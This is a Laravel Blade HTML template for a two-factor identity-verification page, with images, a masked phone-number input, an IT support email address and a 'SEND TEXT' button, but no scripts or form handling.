<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>second page</title>
    <link rel="stylesheet" href="{{asset('css/second_p.css')}}">
    <link href='https://fonts.googleapis.com/css?family=Poppins' rel='stylesheet'>
    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
</head>
<body>
    <div class="containerOuterLayout">
        <img class="img_login" src="{{asset('img/login_img.png')}}">
        <img class="img_header" src="{{asset('img/header.png')}}">
        <img class="img_phone_symbol" src="{{asset('img/phone_symbol.png')}}">
        <p class="title_header">We Need To Verify Your Identity</p>
        <form>
            @csrf
            <input type="number" class="verify_phone" placeholder="+1 ********20">
            <span class="text_1">If your number is incorrect please reach out to</span>
            <span class="support_mail">itsupport@acrabrokerlinks.com</span>
            <button class="button_Send" type="submit" form="form3"><span class="text_Send">SEND TEXT</span></button>
        </form>
    </div>
</body>
</html>
